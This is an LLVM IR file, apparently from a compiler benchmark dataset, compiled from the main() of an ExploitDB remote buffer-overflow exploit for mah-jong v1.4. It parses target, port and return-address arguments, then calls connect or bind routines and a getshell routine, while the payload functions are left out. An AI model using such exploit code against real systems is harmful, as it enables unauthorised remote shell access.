; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23115.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DFLPORT = common dso_local global i16 0, align 2
@DFLADDR = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [121 x i8] c"[*] mah-jong[v1.4]: server/client remote buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"[!] syntax: %s <host|-b> [port] [return address] [offset]\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-b\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@.str.4 = private unnamed_addr constant [59 x i8] c"[*] target: %s:%u, return address(buffer.1+512): 0x%.8x.\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"*\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 0, i16* %6, align 2
  %10 = load i16, i16* @DFLPORT, align 2
  store i16 %10, i16* %7, align 2
  %11 = load i32, i32* @DFLADDR, align 4
  store i32 %11, i32* %8, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @strcmp(i8* %24, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %28, label %27

27:                                               ; preds = %21
  store i16 1, i16* %6, align 2
  br label %28

28:                                               ; preds = %27, %21
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %29, 2
  br i1 %30, label %31, label %37

31:                                               ; preds = %28
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  %36 = trunc i32 %35 to i16
  store i16 %36, i16* %7, align 2
  br label %37

37:                                               ; preds = %31, %28
  %38 = load i32, i32* %4, align 4
  %39 = icmp sgt i32 %38, 3
  br i1 %39, label %40, label %45

40:                                               ; preds = %37
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 3
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @sscanf(i8* %43, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %8)
  br label %45

45:                                               ; preds = %40, %37
  %46 = load i32, i32* %4, align 4
  %47 = icmp sgt i32 %46, 4
  br i1 %47, label %48, label %55

48:                                               ; preds = %45
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 4
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51)
  %53 = load i32, i32* %8, align 4
  %54 = add i32 %53, %52
  store i32 %54, i32* %8, align 4
  br label %55

55:                                               ; preds = %48, %45
  %56 = load i16, i16* %6, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %55
  br label %64

60:                                               ; preds = %55
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  br label %64

64:                                               ; preds = %60, %59
  %65 = phi i8* [ getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), %59 ], [ %63, %60 ]
  %66 = load i16, i16* %7, align 2
  %67 = zext i16 %66 to i32
  %68 = load i32, i32* %8, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.4, i64 0, i64 0), i8* %65, i32 %67, i32 %68)
  %70 = load i16, i16* %6, align 2
  %71 = icmp ne i16 %70, 0
  br i1 %71, label %72, label %76

72:                                               ; preds = %64
  %73 = load i16, i16* %7, align 2
  %74 = load i32, i32* %8, align 4
  %75 = call i8* @mj_bind(i16 zeroext %73, i32 %74)
  store i8* %75, i8** %9, align 8
  br label %83

76:                                               ; preds = %64
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  store i8* %79, i8** %9, align 8
  %80 = load i16, i16* %7, align 2
  %81 = load i32, i32* %8, align 4
  %82 = call i32 @mj_connect(i8* %79, i16 zeroext %80, i32 %81)
  br label %83

83:                                               ; preds = %76, %72
  %84 = call i32 @sleep(i32 1)
  %85 = load i8*, i8** %9, align 8
  %86 = call i32 @getshell(i8* %85, i32 45295)
  %87 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i8* @mj_bind(i16 zeroext, i32) #1

declare dso_local i32 @mj_connect(i8*, i16 zeroext, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getshell(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
